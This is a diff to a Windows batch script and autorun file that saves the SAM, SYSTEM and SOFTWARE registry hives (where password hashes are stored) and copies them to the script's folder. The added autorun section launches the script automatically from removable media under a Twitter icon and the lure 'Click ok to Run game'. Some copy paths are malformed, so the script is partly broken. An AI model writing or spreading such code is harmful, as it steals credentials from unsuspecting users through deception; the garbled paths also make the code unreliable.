@@ -1,7 +1,20 @@
 @echo off
-reg SAVE HKLM\SAM C:\SAM
-reg SAVE HKLM\SYSTEM C:\SYSTEM
-Exit
+reg save hklm\sam c:\sam
+reg save hklm\system c:system
+reg save hklm\software c:\software
+copy "C:\sam" "%~dp0"
+copy "C:\system" "~%dp0"
+copy "C:\software" "~%dp0"
+exit
+
+
+[autorun]
+icon=twitter.ico
+open=samfile.bat
+action=Click ok to Run game
+shell\open\command=samfile.bat
+UseAutoPlay=1
+
 
 
 
